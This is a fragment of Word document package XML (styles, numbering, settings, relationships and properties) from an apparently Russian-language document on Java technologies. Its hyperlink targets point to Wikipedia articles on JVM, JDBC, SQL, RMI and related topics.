  </w:num>
  <w:num w:numId="40">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="41">
    <w:abstractNumId w:val="28"/>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62"/>
    <w:rsid w:val="00073DDF"/>
    <w:rsid w:val="000D4056"/>
    <w:rsid w:val="001826E6"/>
    <w:rsid w:val="001A6C53"/>
    <w:rsid w:val="00322095"/>
    <w:rsid w:val="005307A3"/>
    <w:rsid w:val="005E2C4B"/>
    <w:rsid w:val="006D07EF"/>
    <w:rsid w:val="007D0939"/>
    <w:rsid w:val="00804E28"/>
    <w:rsid w:val="00872F21"/>
    <w:rsid w:val="009405C5"/>
    <w:rsid w:val="00AC0787"/>
    <w:rsid w:val="00BA3D32"/>
    <w:rsid w:val="00C95742"/>
    <w:rsid w:val="00CD4D49"/>
    <w:rsid w:val="00CE73AC"/>
    <w:rsid w:val="00DC7E52"/>
    <w:rsid w:val="00DD2596"/>
    <w:rsid w:val="00F33D0A"/>
    <w:rsid w:val="00FD2581"/>
    <w:rsid w:val="00FE3A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BDD8A-88FF-415A-B38E-F8681229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uiPriority w:val="9"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="007D0939"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:after="0"/>
      <w:ind w:right="71"/>
      <w:jc w:val="center"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
      <w:b/>
      <w:color w:val="000000"/>
      <w:sz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939"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
      <w:b/>
      <w:color w:val="000000"/>
      <w:sz w:val="36"/>
      <w:lang w:val="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="a3">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="a"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="00FD2581"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTML">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="a"/>
    <w:link w:val="HTML0"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00AC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C0787"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:eastAsia="ru-RU"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="a4">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="a0"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00073DDF"/>
    <w:rPr>
      <w:color w:val="0000FF"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="a5">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="a"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006D07EF"/>
    <w:pPr>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="115"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149692">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1774936377">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="18662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Java_Virtual_Machine" TargetMode="External"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%A1%D0%B5%D1%82%D0%B5%D0%B2%D0%BE%D0%B9_%D0%BF%D1%80%D0%BE%D1%82%D0%BE%D0%BA%D0%BE%D0%BB" TargetMode="External"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/JDBC" TargetMode="External"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%9D%D0%B0%D0%B4%D1%91%D0%B6%D0%BD%D0%BE%D1%81%D1%82%D1%8C"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ru.wikipedia.org/wiki/%D0%91%D0%B0%D0%B9%D1%82-%D0%BA%D0%BE%D0%B4" TargetMode="External"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%A1%D1%82%D0%B5%D0%BA" TargetMode="External"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/SQL" TargetMode="External"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%9C%D0%B0%D1%81%D1%88%D1%82%D0%B0%D0%B1%D0%B8%D1%80%D1%83%D0%B5%D0%BC%D0%BE%D1%81%D1%82%D1%8C" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%91%D0%B0%D0%B7%D0%B0_%D0%B4%D0%B0%D0%BD%D0%BD%D1%8B%D1%85" TargetMode="External"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Java_Data_Objects"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ru.wikipedia.org/wiki/%D0%A2%D1%80%D0%B0%D0%BD%D1%81%D0%BB%D1%8F%D1%82%D0%BE%D1%80" TargetMode="External"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%A1%D0%BF%D0%B8%D1%81%D0%BE%D0%BA_(%D0%B8%D0%BD%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B8%D0%BA%D0%B0)" TargetMode="External"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%9D%D0%B0%D0%B3%D1%80%D1%83%D0%B7%D0%BA%D0%B0_(%D0%B7%D0%BD%D0%B0%D1%87%D0%B5%D0%BD%D0%B8%D1%8F)" TargetMode="External"/><Relationship Id="rId5"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15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/HTTP" TargetMode="External"/><Relationship Id="rId23"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28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image3.png"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%98%D0%BD%D0%B4%D0%B5%D0%BA%D1%81%D0%BD%D1%8B%D0%B9_%D0%BC%D0%B0%D1%81%D1%81%D0%B8%D0%B2" TargetMode="External"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/SQLJ"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D0%A1%D0%B1%D0%BE%D1%80%D0%BA%D0%B0_%D0%BC%D1%83%D1%81%D0%BE%D1%80%D0%B0_(%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5)" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/RMI" TargetMode="External"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%98%D0%BD%D0%B6%D0%B5%D0%BD%D0%B5%D1%80%D0%B8%D1%8F_%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D0%BD%D0%BE%D0%B3%D0%BE_%D0%BE%D0%B1%D0%B5%D1%81%D0%BF%D0%B5%D1%87%D0%B5%D0%BD%D0%B8%D1%8F" TargetMode="External"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image2.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30</Pages>
  <Words>6516</Words>
  <Characters>37144</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2019-05-16T11:29:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2019-05-22T10:49:00Z</dcterms:modified>
</cp:coreProperties>
</file>